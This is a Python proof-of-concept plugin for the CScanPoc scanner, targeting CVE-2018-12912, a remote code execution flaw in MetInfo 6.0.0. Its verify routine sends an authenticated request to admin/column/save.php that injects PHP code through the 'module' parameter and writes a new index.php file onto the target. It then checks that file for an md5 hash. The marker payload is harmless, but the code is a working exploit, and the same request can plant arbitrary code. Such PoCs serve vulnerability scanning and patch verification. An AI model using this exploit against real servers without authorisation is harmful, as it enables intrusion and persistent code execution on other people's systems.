# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0008_L'  # 平台漏洞编号
    name = 'Metinfo远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2018-07-24'  # 漏洞公布时间
    desc = '''
    Metinfo 6.0.0版本中存在安全漏洞。远程攻击者可通过向admin/column/save.php文件发送‘module’参数利用该漏洞向.php文件写入代码并执行该代码。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-13848'
    cnvd_id = 'CNVD-2018-13848'  # cnvd漏洞编号
    cve_id = 'CVE-2018-12912'  # cve编号
    product = 'MetInfo'  # 漏洞组件名称
    product_version = '6.0.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fd07b453-eb4c-42f1-86c7-ddcb7f8ee24f'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookie': {
                    'type': 'string',
                    'description': '登录cookie',
                    'default': '',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            headers = {
                'Cookie': self.get_option('cookie'),
                'Content-Type': 'application/x-www-form-urlencoded',
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
            }
            self.output.info('正在构造RCE代码执行测试语句')
            # 新建cscan目录 并写入 echo md5(233)到其中的index.php文件中
            payload = "/admin/column/save.php?name=123&action=editor&foldername=cscan&module=22;echo md5(233);/*"
            vul_url = arg + payload
            reponse = requests.get(vul_url, headers=headers)

            # 验证是否成功触发了代码执行
            test_url = arg + '/cscan/index.php'
            poc_reponse = requests.get(test_url)
            if poc_reponse.status_code == 200 and 'e165421110ba03099a1c0393373c5b4' in poc_reponse.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
